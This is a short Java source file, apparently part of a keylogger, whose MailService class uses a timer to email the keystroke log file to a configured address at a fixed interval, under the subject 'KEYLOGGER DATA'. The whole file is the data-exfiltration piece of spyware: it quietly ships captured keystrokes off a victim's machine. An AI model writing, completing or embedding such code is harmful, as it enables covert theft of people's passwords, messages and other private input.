import java.util.Timer;
import java.util.TimerTask;

public class MailService extends Mail {

    private Timer timer;

    public void sendMailInterval(int min) {
        timer = new Timer();
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                sendMail(Settings.mail, "KEYLOGGER DATA", "", Settings.LOG_FILE_PATH);
            }
        };

        timer.schedule(task, 0, min * 60 * 1000);
    }

    public void stopSendingMail(){
        timer.cancel();
    }
}
